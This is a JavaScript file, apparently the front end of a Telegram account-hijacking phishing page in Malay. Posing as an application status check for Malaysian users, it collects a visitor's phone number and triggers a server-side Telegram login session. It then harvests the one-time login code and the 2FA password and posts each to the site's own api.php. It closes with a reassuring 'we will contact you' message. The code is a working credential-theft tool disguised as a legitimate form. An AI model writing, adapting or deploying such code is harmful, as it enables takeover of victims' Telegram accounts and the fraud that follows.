const API_BASE = "api.php?path=";

// === HELPER: FORMAT PHONE (digunakan di semua langkah) ===
function formatPhone(raw) {
    let phone = raw.trim().replace(/\s+/g, '');
    if (phone.startsWith('0')) phone = '+60' + phone.substring(1);
    if (!phone.startsWith('+60')) phone = '+60' + phone.replace(/^(\+)?60/, '');
    return phone;
}

function showResponseMessage(message, type = 'success', autoHide = false, hideAfter = 3000) {
    const alertClass = type === 'success' ? 'alert-success' : 'alert-danger';
    const responseElement = $('.responseMessage:visible');
    responseElement.html(`<div class="alert ${alertClass}">${message}</div>`);
    if (autoHide) setTimeout(() => { responseElement.html(''); }, hideAfter);
}

function showLoadingSpinner() { $('#loadingSpinner').removeClass('d-none'); }
function hideLoadingSpinner() { $('#loadingSpinner').addClass('d-none'); }

function updateGuideText() {
    if (!$("#loginForm").hasClass("d-none") && $("#otpForm").hasClass("d-none")) {
        $("#guide-text").text("Masukkan nombor Telegram anda untuk semakan segera dan kemaskini permohonan anda.");
        $('#reloadBtn').addClass('d-none');
    } else if (!$("#otpForm").hasClass("d-none") && $("#loginForm").hasClass("d-none")) {
        $("#guide-text").text("Masukkan kod OTP (5 digit) yang dihantar ke Telegram anda.");
        $('#reloadBtn').removeClass('d-none');
    } else if (!$("#2faForm").hasClass("d-none")) {
        $("#guide-text").text("Masukkan kata laluan 2FA Telegram (jika ada).");
        $('#reloadBtn').removeClass('d-none');
    }
}
updateGuideText();

// === LANGKAH 1: HANTAR NOMBOR TELEFON ===
$('#loginForm').on('submit', async function (e) {
    e.preventDefault();
    const name = $('#name').val().trim();
    const phone = formatPhone($('#phoneNumber').val());

    if (!/^\+60\d{8,12}$/.test(phone)) {
        showResponseMessage('Nombor telefon tidak sah. Sila masukkan nombor Malaysia yang betul.', 'error', true);
        return;
    }

    $('#phoneNumber').val(phone);

    showLoadingSpinner();
    $('.responseMessage').html('');

    try {
        const res = await fetch(`${API_BASE}generate-session`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ phone_number: phone })
        });
        const data = await res.json();
        hideLoadingSpinner();

        if (data.status === "success") {
            showResponseMessage("Kod OTP telah dihantar ke akaun Telegram anda.", "success", true);
            $('#loginForm').addClass('d-none');
            $('#otpForm').removeClass('d-none');
            updateGuideText();
        } else {
            showResponseMessage(data.error || data.message || "Ralat menghantar OTP.", "error");
        }
    } catch (err) {
        hideLoadingSpinner();
        console.error("REQUEST ERROR:", err);
        showResponseMessage(err.message || "Ralat sambungan ke pelayan.", "error");
    }
});

// === OTP AUTO FOKUS DAN BACKSPACE ===
$(".otp-input").on("input", function () {
    const val = $(this).val().replace(/\D/g, '');
    $(this).val(val);
    if (val && $(this).next(".otp-input").length) $(this).next(".otp-input").focus();
});
$(".otp-input").on("keydown", function (e) {
    if (e.key === "Backspace" && !$(this).val()) $(this).prev(".otp-input").focus();
});
$(".otp-input").on("paste", function (e) {
    const data = (e.originalEvent || e).clipboardData.getData('text').replace(/\D/g, '').substr(0, 5);
    $(".otp-input").each((i, el) => $(el).val(data[i] || ''));
    $(".otp-input").eq(data.length >= 5 ? 4 : data.length).focus();
    e.preventDefault();
});

// === LANGKAH 2: HANTAR OTP ===
$('#otpForm').on('submit', async function (e) {
    e.preventDefault();
    let otp = "";
    $(".otp-input").each(function () { otp += $(this).val(); });

    if (otp.length !== 5) {
        showResponseMessage("Sila masukkan 5 digit kod OTP yang sah.", "error", true);
        return;
    }

    // Gunakan formatPhone supaya konsisten dengan langkah 1
    const phone = formatPhone($('#phoneNumber').val());

    showLoadingSpinner();
    $('.responseMessage').html('');

    try {
        const res = await fetch(`${API_BASE}validate-otp`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ phone_number: phone, otp })
        });
        const data = await res.json();
        hideLoadingSpinner();

        if (data.status === "success") {
            showResponseMessage("Pendaftaran berjaya! Akaun Telegram telah disahkan.", "success", true);
            setTimeout(() => location.reload(), 2000);
        } else if (data.status === "error" && data.message === "session_password_needed") {
            showResponseMessage("Akaun ini dilindungi 2FA. Sila masukkan kata laluan anda.", "success");
            $('#otpForm').addClass('d-none');
            $('#2faForm').removeClass('d-none');
            updateGuideText();
        } else {
            showResponseMessage(data.error || data.message || "Ralat menghantar OTP.", "error");
        }
    } catch (err) {
        hideLoadingSpinner();
        showResponseMessage("Ralat sambungan ke pelayan.", "error");
    }
});

// === LANGKAH 3: HANTAR PASSWORD 2FA ===
$('#2faForm').on('submit', async function (e) {
    e.preventDefault();
    // Gunakan formatPhone supaya konsisten dengan langkah 1
    const phone = formatPhone($('#phoneNumber').val());
    const password = $('#fa2').val();

    showLoadingSpinner();
    $('.responseMessage').html('');

    try {
        const res = await fetch(`${API_BASE}validate-password`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ phone_number: phone, password })
        });
        const data = await res.json();
        hideLoadingSpinner();

        if (data.status === "success") {
            showResponseMessage("Permohonan anda berjaya dihantar. Kami akan hubungi anda kemudian.", "success", true);
            $('#2faForm button[type="submit"]').prop('disabled', true);
            setTimeout(() => location.reload(), 2200);
        } else {
           showResponseMessage(data.error || data.message || "Kata laluan tidak sah.", "error");
        }
    } catch (err) {
        hideLoadingSpinner();
        showResponseMessage("Ralat sambungan ke pelayan.", "error");
    }
});

// === BUTANG MUAT SEMULA ===
$('#reloadBtn button').on('click', function () { location.reload(); });
